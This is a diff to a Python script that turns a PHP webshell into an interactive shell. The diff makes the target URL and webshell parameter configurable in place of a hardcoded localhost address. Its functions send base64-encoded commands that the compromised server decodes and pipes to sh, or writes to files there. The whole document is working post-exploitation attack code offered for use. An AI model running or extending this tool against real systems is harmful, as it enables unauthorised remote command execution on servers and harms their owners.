@@ -1,8 +1,13 @@
 #!/usr/bin/python3
 
-import requests, time, threading, pdb, signal, sys
+import requests, time, threading, pdb, signal, sys, argparse
 from base64 import b64encode
 from random import randrange
+
+args = argparse.ArgumentParser(description="Get a TTY from a webshell.")
+args.add_argument('-t', '--target', help="Declarate the target.")
+args.add_argument('-p', '--parameter', default="cmd", help="Parameter that webshell takes to be executed.")
+args = args.parse_args()
 
 class AllTheReads(object):
 	def __init__(self, interval=1):
@@ -25,18 +30,18 @@ def RunCmd(cmd):
 	cmd = cmd.encode('utf-8')
 	cmd = b64encode(cmd).decode('utf-8')
 	payload = {
-        	'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
+        	args.parameter : 'echo "%s" | base64 -d | sh' %(cmd)
 		}
-	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
+	result = (requests.get(args.target, params=payload, timeout=5).text).strip()
 	return result
 
 def WriteCmd(cmd):
 	cmd = cmd.encode('utf-8')
 	cmd = b64encode(cmd).decode('utf-8')
 	payload = {
-		'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
+		args.parameter : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
 	}
-	result = (requests.get('http://127.0.0.1/index.php', params=payload, timeout=5).text).strip()
+	result = (requests.get(args.target, params=payload, timeout=5).text).strip()
 	return result
 
 def ReadCmd():
